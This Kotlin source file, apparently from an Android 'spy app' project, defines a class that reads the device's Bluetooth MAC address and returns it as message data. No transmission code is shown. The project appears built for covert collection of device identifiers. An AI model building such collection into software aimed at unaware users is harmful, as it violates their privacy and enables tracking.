package com.komnacki.androidspyapp.device.bluetooth

import android.content.Context
import com.komnacki.androidspyapp.Message
import github.nisrulz.easydeviceinfo.base.BatteryHealth
import github.nisrulz.easydeviceinfo.base.ChargingVia
import github.nisrulz.easydeviceinfo.base.EasyBatteryMod
import github.nisrulz.easydeviceinfo.base.EasyBluetoothMod


class BluetoothState(override var context: Context) :
    Message {
    init {
        getBluetoothState(
            context
        )
    }

    companion object {
        private val info : MutableMap<String, Any> = mutableMapOf()

        fun getBluetoothState(context: Context) {
            val easyBluetoothState = EasyBluetoothMod(context)
            info["MAC"] = easyBluetoothState.bluetoothMAC
        }
    }

    override fun getData(): Map<String, Any> {
        return info
    }
}